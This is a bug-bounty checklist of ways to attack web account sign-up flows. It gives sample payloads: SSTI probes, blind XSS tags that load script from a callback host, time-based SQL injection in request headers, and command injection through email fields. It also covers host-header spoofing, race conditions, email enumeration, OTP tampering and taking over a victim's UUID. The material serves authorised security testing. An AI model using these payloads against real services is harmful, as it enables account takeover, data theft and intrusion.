

- Try To Sign Up On Web AND Mobile App To Understand How Company Deal With Registration And Read The Received Email To Know What is Reflected
	![[Screenshot 2023-06-07 194630.jpg]]
- If You Need Business Email Try To Use username@bugcrowdninja.com OR username@wearehackerone.com
	![[Screenshot 2023-06-07 194715.jpg]]
	
- Note That , Gmail Treats Me@gmail.com AND Me+1@gmail.com As One Email , So When You Need To Create Multi Accounts , Use This Feature
	![[Screenshot 2023-06-07 194802.jpg]]

- **You Can Use Burp Suite Collaborator To Create Multi Accounts e.g.  me@one.id.collaborator.net , me@two.id.collaborator.net etc**
	![[Screenshot 2023-06-07 200331.jpg]]

- If There Is Google's ReCAPTCHA Try To Configure TLS Pass Through Of Burp Suite e.g.   .*google.com.*

	![[Screenshot 2023-06-07 200448.jpg]]

* Try To Sign Up With Existing Email Address e.g. existing@gmail.com , Sometimes Authorization Token Will Reflect In Response
	![[Screenshot 2023-06-07 203136.jpg]]

- Try To Sign Up With Company Mail Address e.g. admin@company.com To Gain Extra Authorities OR Get More Functionalities

	![[Screenshot 2023-06-07 203322.jpg]]

- Try To Sign Up With Company Mail Address Plus Space e.g. 'admin@company.com ' To Gain Extra Authorities OR Get More Functionalities
	
	![[Screenshot 2023-06-07 203448.jpg]]

- Try To Sign Up With Company Capitalize Mail Address e.g. admin@COMPANY.COM To Gain Extra Authorities OR Get More Functionalities
	![[Screenshot 2023-06-07 203628.jpg]]

- Try To Sign Up With Company Mail Address In This List To Gain Extra Authorities OR Get More Functionalities
	
	![[Screenshot 2023-06-07 204000.jpg]]

- Try To Sign Up By Using This List Of Payloads As Email Addresses To Get XSS , SSTI , SQLi OR Abusing Of Database
	![[Screenshot 2023-06-07 205240.jpg]]

- Try To Sign Up By Using This List With Burp Collaborator Mail Address To Get Backend Information OR Internal IPs

	![[Screenshot 2023-06-07 211540.jpg]]

- Sometimes They Ping Your Host Before Sending A Mail So Try To Sign Up By Using Burp Collaborator Mail Address with Injection OS Command To Get RCE

	![[Screenshot 2023-06-07 211654.jpg]]

- Try To Sign Up With Company Mail Address e.g. admin@company.com Then Try To Access To All Endpoints Of The Company Without Verifying admin@company.com

	![[Screenshot 2023-06-07 212321.jpg]]

- If Company Accepted admin@company.com As Email Address But You Can't Activate It , Try To Spoof Host Header e.g X-Forwarded-Host OR X-Host
	![[Screenshot 2023-06-07 212414.jpg]]

- Try To Insert SSTI Payloads e.g. {{7*7}} , {7*7} OR ${7*7} In Username , First Name OR Last Name

	![[Screenshot 2023-06-07 213853.jpg]]

- Try To Insert <% In Username , First Name OR Last Name , So If <% Reflected In Email Body Try To Inject <%= 7 * 7 %> To Get SSTI

	![[Screenshot 2023-06-07 214016.jpg]]

- Try To Set Your Name , First Name , Last Name etc As Blind XSS e.g. "><script src=//me.xss.ht></script> To Get BXSS In Admin Panel

![[Screenshot 2023-06-07 214933.jpg]]

- Try To Set Your Name , First Name , Last Name etc As Blind XSS e.g. <img src="//me.xss.ht"> To Get BXSS In Admin Panel

	![[Screenshot 2023-06-07 215145.jpg]]

* Try To Set Password As Blind XSS e.g. "><script src=//me.xss.ht></script> OR XSS Payload To Know If Your Password Reflect Plaintext In Backend OR Not

	![[Screenshot 2023-06-07 215251.jpg]]

- Try To Set Your Name , First Name , Last Name etc As TRUE , NULL , UNDEFINED etc

	![[Screenshot 2023-06-07 215440.jpg]]

+ Try To Insert Invisible Range %00 To %FF in Your Email OR Username e.g. Victim's Username is bob , You Can't Register it So Use bob%00 OR %01bob

	![[Screenshot 2023-06-07 215537.jpg]]

- Try To Insert Large String 50.000+ Characters OR Numbers in POST Parameters To Cause Errors Exposing Sensitive Information

	![[Screenshot 2023-06-07 215754.jpg]]

- Try To Set Password e.g. %01%E2%80%AEalert%0D%0A Then Try To Log In Only Using %01 , Log In Without CRLF And Is trela Accepted Instead Of alert ?

	![[Screenshot 2023-06-07 215952.jpg]]

- If The Company Uses Invitation To Create Account Try To Use Race Condition Technique To Create Multi Accounts By Using Only One Invitation

	![[Screenshot 2023-06-07 220036.jpg]]

- Try To Do Brute Force To Create Multi Accounts OR Enumerate Email Addresses If The Company Doesn't Send Activation Link To Your Account

	![[Screenshot 2023-06-07 220556.jpg]]

- Try To Insert SQLi Payloads e.g. ' AND '1' = '2 OR ";WAITFOR DELAY '0.0.20'--  OR Blind XSS In User-Agent

	![[Screenshot 2023-06-07 220649.jpg]]

- Try To Inject Blind XSS e.g. "><script src=//me.xss.ht></script> OR Time-Based SQLi e.g. ";WAITFOR DELAY '0.0.20'-- In X-Forwarded-For Header

	![[Screenshot 2023-06-07 220743.jpg]]

- Try To Set Your Birthday Today OR Tomorrow To Test Functionality Of Buying Giftcards With Birthday Discounts

	![[Screenshot 2023-06-07 220909.jpg]]

- If You Can Register By Using Mobile-Number  , The Server Will Ask You about OTP So Try To Figure Out If OTP Will Expire OR Not , If Not There Is Issue Here

	![[Screenshot 2023-06-07 220952.jpg]]

- If You Can Register By Using Mobile-Number  , The Server Will Ask You about OTP So Try To Manipulate The Response If You Entered a Wrong Mobile-Number

	![[Screenshot 2023-06-07 221202.jpg]]

- Try To change Any UUID e.g. ID , Email OR Phone In The Response To UUID Of Victim Account While Intercepting Response Of Request Of The Sign Up
	![[Screenshot 2023-06-07 221240.jpg]]

- If There Isn't CSRF Token OR Anti-CSRF , Try To Create CSRF POC

![[Screenshot 2023-06-07 221331.jpg]]

- Retrieve Data From Deleted Account , By Signing Up With the Old-Email Address That Was Associated To it
![[Screenshot 2023-06-07 221438.jpg]]

